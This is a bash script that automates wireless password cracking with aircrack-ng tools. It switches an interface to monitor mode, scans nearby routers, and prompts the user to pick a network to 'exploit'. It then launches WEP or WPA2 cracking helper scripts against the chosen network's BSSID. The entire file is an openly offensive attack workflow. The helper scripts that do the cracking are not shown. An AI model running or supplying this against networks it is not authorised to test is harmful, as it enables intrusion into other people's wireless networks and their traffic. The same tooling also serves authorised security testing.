# Select Interface
echo "What interface do you want to monitor?"
iwconfig 2>/dev/null | grep -o '^[a-z0-9]\+'
read interface

# Use Airmon to change interface into monitor mode
airmon-ng check kill > /dev/null
airmon-ng start $interface > /dev/null

# Determine correct monitor interface
echo "Which interface is now in monitor mode?"
iwconfig 2>/dev/null | grep -o '^[a-z0-9]\+'
read monInterface

# Launch terminal that gets a list of routers on the network
x-terminal-emulator -e "sudo /bin/bash -c './airodump1.sh $monInterface; exec /bin/bash -i'"
# Wait 5 seconds so the interface captures a lot of networks
sleep 5
# Format CSV
cat airodumpInfo-01.csv | awk '/^Station MAC/{exit} {print $0}' | tail -n +3 | head -n -3 | sort -r -n -t',' -k11 > temp.csv

# Request network to exploit
echo "Which network do you want to exploit?"
echo "The networks are ordered by network strength, so if there are duplicates, pick the higher one"
cat temp.csv | awk -F',' '{num += 1; print num ": " $14;}'
read num

# Get important information from CSV
line=$(sed "${num}q;d" temp.csv)
bssid=$(echo $line | cut -d ',' -f 1)
channel=$(echo $line | cut -d ',' -f 4)
encrypt=$(echo $line | cut -d ',' -f 6)

# Start Gathering information from the specified router
x-terminal-emulator -e "sudo /bin/bash -c './airodump2.sh $monInterface $bssid $channel; exec /bin/bash -i'"

echo "Press Enter to begin password cracking"
read -s

# Pick exploit that works with encryption method
if [ $encrypt == "WEP" ]
then
	x-terminal-emulator -e "sudo /bin/bash -c './WEPcrack.sh $bssid; exec /bin/bash -i'"
fi
if [ $encrypt = "WPA2" ]
then
	x-terminal-emulator -e "sudo /bin/bash -c './WPAcrack.sh $bssid; exec /bin/bash -i'"
fi
echo "Press Enter when done"
read -s

# Reset monitor interface so the user gets back internet access
sudo /bin/bash ./reset.sh $monInterface $interface
